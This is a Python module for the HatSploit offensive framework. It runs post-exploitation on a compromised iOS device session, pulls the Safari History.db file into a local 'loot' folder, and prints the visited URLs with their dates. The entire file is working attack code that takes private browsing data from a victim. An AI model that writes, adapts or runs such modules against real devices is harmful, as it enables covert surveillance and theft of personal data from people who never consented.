#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.lib.sessions import Sessions
from hatsploit.lib.loot import Loot

from pex.db import DBTools


class HatSploitModule(Module, Sessions, DBTools):
    details = {
        'Category': "post",
        'Name': "Obtain Safari history",
        'Module': "post/apple_ios/shell/safari_history",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Get iOS Safari history database and parse it.",
        'Platform': "apple_ios",
        'Rank': "medium"
    }

    options = {
        'SESSION': {
            'Description': "Session to run on.",
            'Value': None,
            'Type': "session",
            'Required': True
        },
        'PATH': {
            'Description': "Path to save file.",
            'Value': Loot().specific_loot('History.db'),
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        session, path = self.parse_options(self.options)
        history = '/private/var/mobile/Library/Safari/History.db'

        path = self.session_download(session, history, path)
        if path:
            self.print_process("Parsing history database...")

            try:
                history = self.parse_safari_bookmarks(path)
            except Exception:
                self.print_error("Failed to parse history database!")
                return

            history_data = []
            for item in history:
                history_data.append((item['date'], item['details']['url']))

            if history_data:
                self.print_table("History", ('Date', 'URL'), *history_data)
            else:
                self.print_warning("No history available on device.")
